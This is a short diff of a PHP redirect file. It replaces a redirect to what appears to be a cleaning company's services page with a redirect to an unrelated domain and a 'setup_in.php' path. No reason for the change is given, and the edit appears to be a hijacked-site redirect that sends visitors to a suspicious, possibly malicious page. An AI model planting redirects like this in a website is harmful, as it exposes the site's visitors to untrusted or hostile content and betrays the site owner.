@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.cleanearthcleaners.com/services");
+header("Location: https://start-your-product.site/actofc/setup_in.php");
 die();
 ?>
